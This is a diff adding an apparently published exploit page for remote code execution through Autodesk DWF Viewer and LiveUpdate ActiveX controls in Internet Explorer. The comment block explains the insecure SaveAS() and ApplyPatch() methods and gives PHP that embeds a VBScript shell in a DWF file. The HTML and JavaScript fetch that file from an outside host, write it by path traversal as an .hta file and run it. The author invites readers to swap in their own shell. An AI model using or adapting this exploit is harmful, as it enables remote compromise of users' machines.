@@ -1,0 +1,93 @@
+<!-- 
+Autodesk DWF Viewer Control / LiveUpdate Module remote code execution exploit
+by Nine:Situations:Group::bruiser 
+site: http://retrogod.altervista.org/
+tested against IE6
+
+tested software:  Revit Architecture 2009 sp2
+                  Autodesk Design Review 2009 (which also comes with Revit)
+
+
+dll settings (both):
+RegKey Safe for Script: True
+RegKey Safe for Init: True
+Implements IObjectSafety: False
+KillBitSet: False
+
+The first vulnerability is caused due to the CExpressViewerControl class 
+(AdView.dll v9.0.0.96) which provide the insecure SaveAS() method 
+which allows to store locally files with arbitrary extension.
+The second one is related to the ApplyPatch() one inside the UpdateEngine
+class (LiveUpdate16.DLL, 17.2.56 ??... this is a shared one) which allows to launch an arbitrary 
+executable by the second argument. Note, that the first one, alone, allows
+arbitrary code execution. The impact of the second one is limited if you cannot 
+specify command arguments or launch a file of yours.
+
+The embedded dwf file (located at the url http://retrogod.altervista.org/suntzu.dwf)
+has been created modifying an existing one, replacing a .png resource file with 
+a vbscript shell through the following script (note the PCLZIP_OPT_NO_COMPRESSION flag,
+this has been used to preserve the code, note also the dwg files are
+essentially zips) :
+
+<?php
+    //library:
+    //http://www.phpconcept.net/pclzip/index.en.php#download
+    include_once('pclzip.lib.php');
+
+    $archive = new PclZip('suntzu.dwf');
+     
+    //modify path
+    $list = $archive->add("com.autodesk.dwf.ePlot_CD186DAA4322089243B140AD3ACE11B7\\A84650EE-74A7-4766-8D0C-CC9EAE8313D3.png", PCLZIP_OPT_NO_COMPRESSION);
+    
+    if ($list == 0) {
+      echo "ERROR : ".$archive->errorInfo(true);
+    }
+?> 
+
+take a look to suntzu.dwf with an hex-editor...
+This exploit launch calc.exe but you can embed your own vbscript shell
+and extended shell commands, by using the php code given.
+-->
+<HTML>
+<OBJECT CLASSID="clsid:A662DA7E-CCB7-4743-B71A-D817F6D575DF"
+WIDTH="640" HEIGHT="480"
+id='CExpressViewerControl' >
+<PARAM NAME="Src"
+VALUE="http://retrogod.altervista.org/suntzu.dwf">
+</OBJECT> 
+<OBJECT CLASSID='clsid:89EC7921-729B-4116-A819-DF86A4A5776B' 
+id='UpdateEngine' />
+</OBJECT>
+<script type="text/javascript">
+<!-- 
+   strPatchFile = "..\\..\\..\\..\\..\\..\\..\\suntzu.hta";
+
+try
+{
+   CExpressViewerControl.SaveAS (strPatchFile); 
+}
+catch(e)
+{
+   document.write("impossible to save suntzu.hta ...");
+}
+finally
+{
+}
+   strProductCode="whatever" ;
+
+try
+{
+   UpdateEngine.ApplyPatch (strProductCode , strPatchFile);
+}
+catch(e)
+{
+   document.write("impossible to execute suntzu.hta ...");
+}
+finally
+{
+}
+
+--> 
+</script>
+
+# milw0rm.com [2008-09-30]
